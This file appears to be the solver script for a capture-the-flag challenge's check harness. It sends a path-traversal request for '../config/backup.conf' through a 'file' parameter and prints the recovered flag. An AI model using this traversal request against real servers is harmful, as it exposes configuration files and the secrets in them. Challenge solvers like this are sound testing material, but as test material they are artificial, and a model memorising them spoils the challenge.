// Benign solver: prints only the recovered flag, for the check harness.
const url = new URL('view', process.env.TARGET);
url.searchParams.set('file', '../config/backup.conf');
const flag = /CTF\{[^}]+\}/u.exec(await (await fetch(url)).text())?.[0];
if (!flag) process.exit(1);
process.stdout.write(flag);
